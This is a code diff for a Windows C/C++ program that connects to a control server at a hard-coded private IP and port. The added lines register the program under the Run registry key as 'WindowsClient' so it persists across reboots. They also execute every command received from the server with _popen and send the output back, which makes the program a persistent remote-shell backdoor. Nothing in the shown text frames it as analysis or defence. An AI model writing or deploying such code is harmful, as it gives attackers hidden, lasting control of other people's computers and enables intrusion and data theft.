@@ -4,11 +4,34 @@
 #include <stdio.h>
 #include <stdlib.h>
 #include <windows.h>
+#include <string>
+#include <iostream>
 
 #define SERV_PORT 52727 // The port the control server is listening on
 const char szHost[] = "192.168.1.140";
 
 int main(const int argc, const char* argv[]){
+	// === First ensure persistence:
+	HKEY hKey;
+    LONG lResult = RegOpenKeyEx(
+        HKEY_LOCAL_MACHINE,
+        TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
+        0,
+        KEY_WRITE,
+        &hKey
+    ); /* wont bother handling errors */
+    char szPath[MAX_PATH];
+    DWORD dwSize = GetModuleFileName(NULL, szPath, MAX_PATH);
+	lResult = RegSetValueEx(
+		hKey,
+		TEXT("WindowsClient"),
+		0,
+		REG_SZ,
+		(BYTE*)szPath,
+		dwSize
+	); /* wont bother handling errors */
+	RegCloseKey(hKey);
+
     // Initialise winsock
     WSAData wsaData;
     WORD DllVersion = MAKEWORD(2, 1);
@@ -40,13 +63,21 @@ int main(const int argc, const char* argv[]){
         ExitProcess(EXIT_SUCCESS);
     }
 
-    // Receive some data from the server
-    char szBuffer[1024];
+    char szBuffer[1024]; // A buffer to receive commands on
     while(1){
-        recv(sock, szBuffer, 1024, 0);
-        printf("%s\n", szBuffer);
         ZeroMemory(&szBuffer, sizeof(szBuffer));
-    }
+        recv(sock, szBuffer, 1024, 0);
+        printf("RECVCMD: %s\n", szBuffer);
+        FILE* p = _popen(szBuffer, "r");
+        char szCmdResultBuffer[4096];
+        std::string result;
+		while(fgets(szCmdResultBuffer, sizeof(szCmdResultBuffer), p) != nullptr) {
+			result += szCmdResultBuffer;
+		}
+		_pclose(p);
+		std::cout << "SNDRSLT: " << result << std::endl;
+		send(sock, result.c_str(), result.length(), 0);
+	}
 
     closesocket(sock);
     ExitProcess(EXIT_SUCCESS); // Like return, but the OS/kernel likes it a bit more - best practice
